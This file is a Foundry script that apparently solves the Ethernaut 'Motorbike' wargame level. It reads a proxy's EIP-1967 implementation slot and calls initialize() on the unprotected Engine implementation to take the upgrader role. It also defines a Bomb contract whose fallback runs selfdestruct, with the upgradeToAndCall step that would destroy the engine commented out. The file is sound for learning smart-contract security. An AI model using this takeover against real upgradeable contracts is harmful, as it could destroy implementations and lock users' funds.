// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import {Script, console} from "forge-std/Script.sol";
import { Motorbike, Engine } from "../src/Motorbike.sol";

contract Bomb {
    fallback () external {
        selfdestruct(address(0));
    }
}

contract MotorbikeSolver is Script {
	
	// Motorbike public instance = Motorbike(payable(0x4515021B8232Abe3323E48D9537D54337D549b68));
	// Engine public engine = Engine(0x5b6c89e2af705d51D6d164b46107204046173964);

	Engine public engine = new Engine();
	Motorbike public instance = new Motorbike(address(engine));

	uint256 prv = vm.envUint("PRV");

	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

        bytes32 data = vm.load(address(instance), bytes32(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address engineAddress = address(uint160(uint256(data)));
        console.log(engineAddress);
        // address of engine

        console.log(engine.upgrader());

        engine.initialize();
        address(instance).call{value: 1 wei}("nnnnnnnn all");
        // Bomb bomb = new Bomb();
        // engine.upgradeToAndCall(address(bomb), "doesntexist");

        console.log(engine.upgrader());


		vm.stopBroadcast();


	}

}
